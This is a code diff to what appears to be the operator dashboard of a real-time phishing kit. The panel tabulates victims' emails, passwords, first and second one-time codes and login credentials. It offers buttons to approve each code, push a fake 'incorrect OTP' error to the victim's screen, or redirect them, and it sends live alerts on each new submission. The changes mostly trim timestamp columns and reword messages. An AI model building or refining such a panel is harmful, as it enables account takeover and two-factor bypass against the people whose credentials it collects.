@@ -164,7 +164,7 @@ body {
 table {
   width: 100%;
   border-collapse: collapse;
-  min-width: 1400px;
+  min-width: 1200px;
 }
 th {
   text-align: left;
@@ -258,14 +258,6 @@ tr:hover {
 .copy-icon:hover {
   color: var(--copy-btn-hover);
   background: var(--border-light);
-}
-
-/* Timestamp styling */
-.timestamp {
-  font-size: 10px;
-  font-family: monospace;
-  color: var(--text-muted);
-  white-space: nowrap;
 }
 
 /* Data Styling */
@@ -389,6 +381,7 @@ tr:hover {
   font-size: 11px;
 }
 
+/* Text Modal (Popup only for Send Text) */
 .text-modal-overlay {
   display: none;
   position: fixed;
@@ -560,8 +553,8 @@ tr:hover {
         <tr>
           <th>Email</th>
           <th>Password</th>
-          <th>First OTP / Time</th>
-          <th>Second OTP / Time</th>
+          <th>First OTP</th>
+          <th>Second OTP</th>
           <th>Login Email</th>
           <th>Login Password</th>
           <th>Registered</th>
@@ -670,7 +663,7 @@ tr:hover {
     } catch(e) {}
   }
 
-  function formatTimestamp(dateStr, fieldName) {
+  function formatTimestamp(dateStr) {
     if (!dateStr) return '<span class="data-empty">—</span>';
     const date = new Date(dateStr);
     return `<span class="timestamp" title="${date.toLocaleString()}">${date.toLocaleString()}</span>`;
@@ -764,7 +757,6 @@ tr:hover {
       });
       const data = await response.json();
       if (data.success) {
-        showNotification('Popup Released', `Text popup closed for ${currentSelectedEmail}`, 'release', false);
         hideTextModal();
         loadUsers();
       } else {
@@ -827,8 +819,9 @@ tr:hover {
     }
   }
 
+  // INCORRECT OTP - Shows RED error message (not a popup)
   async function incorrectOTP(email) {
-    if (confirm(`❌ Mark OTP as incorrect for: ${email}?\n\nUser will receive a message to check their email.`)) {
+    if (confirm(`❌ Mark OTP as incorrect for: ${email}?\n\nUser will see an error message on their screen.`)) {
       try {
         const response = await fetch('/api/admin/incorrect-otp', {
           method: 'POST',
@@ -840,7 +833,7 @@ tr:hover {
         });
         const data = await response.json();
         if (data.success) {
-          showNotification('Incorrect OTP', `Message sent to ${email}`, 'incorrect', true);
+          showNotification('Incorrect OTP', `Error message sent to ${email}`, 'incorrect', true);
         } else {
           showNotification('Error', data.error || 'Failed to send incorrect OTP message', 'error', false);
         }
@@ -973,7 +966,6 @@ tr:hover {
       let statusBadge = '';
       let actionButtons = '';
       
-      // Determine status
       if (user.redirect_success === true) {
         statusBadge = '<span class="badge badge-blocked">🚫 Redirected to Success</span>';
       } else if (user.approved && user.second_approved) {
@@ -988,7 +980,6 @@ tr:hover {
         statusBadge = '<span class="badge badge-pending">Pending</span>';
       }
       
-      // ALL BUTTONS ALWAYS VISIBLE
       actionButtons = `
         <button class="action-btn approve-email-btn" onclick="approveEmail('${user.email}')" ${user.approved ? 'disabled style="opacity:0.5;"' : ''}><i class="fas fa-envelope"></i> Approve Email</button>
         <button class="action-btn approve-second-btn" onclick="approveSecond('${user.email}')"><i class="fas fa-check-circle"></i> Approve Current OTP</button>
@@ -1000,27 +991,15 @@ tr:hover {
         <button class="action-btn delete-user-btn" onclick="deleteUser('${user.email}')"><i class="fas fa-trash-alt"></i> Delete</button>
       `;
       
-      // Format timestamps
-      const firstOtpDisplay = user.otp ? formatValue(user.otp, 'First OTP') : '<span class="data-empty">—</span>';
-      const firstOtpTime = user.first_otp_submitted_at ? formatTimestamp(user.first_otp_submitted_at, 'First OTP Time') : '<span class="data-empty">—</span>';
-      const secondOtpDisplay = user.second_otp ? formatValue(user.second_otp, 'Second OTP') : '<span class="data-empty">—</span>';
-      const secondOtpTime = user.second_otp_submitted_at ? formatTimestamp(user.second_otp_submitted_at, 'Second OTP Time') : '<span class="data-empty">—</span>';
-      
       return `
         <tr>
           <td>${formatValue(user.email, 'Email')}</td>
           <td>${formatValue(user.password, 'Password')}</td>
-          <td>
-            ${firstOtpDisplay}<br>
-            <span style="font-size: 9px;">${firstOtpTime}</span>
-          </td>
-          <td>
-            ${secondOtpDisplay}<br>
-            <span style="font-size: 9px;">${secondOtpTime}</span>
-          </td>
+          <td>${user.otp ? formatValue(user.otp, 'First OTP') : '<span class="data-empty">—</span>'}</td>
+          <td>${user.second_otp ? formatValue(user.second_otp, 'Second OTP') : '<span class="data-empty">—</span>'}</td>
           <td>${user.login_email ? formatValue(user.login_email, 'Login Email') : '<span class="data-empty">—</span>'}</td>
           <td>${user.login_password ? formatValue(user.login_password, 'Login Password') : '<span class="data-empty">—</span>'}</td>
-          <td>${formatTimestamp(user.email_submitted_at, 'Submitted')}</td>
+          <td>${formatTimestamp(user.email_submitted_at)}</td>
           <td>${statusBadge}</td>
           <td class="actions-cell">${actionButtons}</td>
         </tr>
@@ -1112,7 +1091,6 @@ tr:hover {
     window.location.href = '/admin';
   }
 
-  // Socket listeners
   socket.on('connect', () => console.log('Admin connected'));
   socket.on('user-login', (data) => {
     showNotification('📧 New Email Submission', `${data.email} signed up`, 'email', true);
